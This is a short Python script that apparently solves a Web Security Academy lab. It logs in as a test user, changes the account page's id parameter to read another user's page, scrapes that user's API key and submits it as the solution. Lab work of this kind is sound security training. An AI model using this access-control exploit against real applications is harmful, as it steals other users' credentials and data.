import requests, re
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac651f821fbbd3eec039c8b2006200f3.web-security-academy.net'

login_url = f'https://{site}/login'

login_data = {
    'username' : 'wiener',
    'password' : 'peter'
}

resp = s.post(login_url, data=login_data)

resp = s.get(f'https://{site}/my-account?id=carlos')
soup = BeautifulSoup(resp.text,'html.parser')
div_text = soup.find('div', text=re.compile('API')).text
api_key = div_text.split(' ')[4]
url = f'https://{site}/submitSolution'
resp = s.post(url,data={'answer':api_key})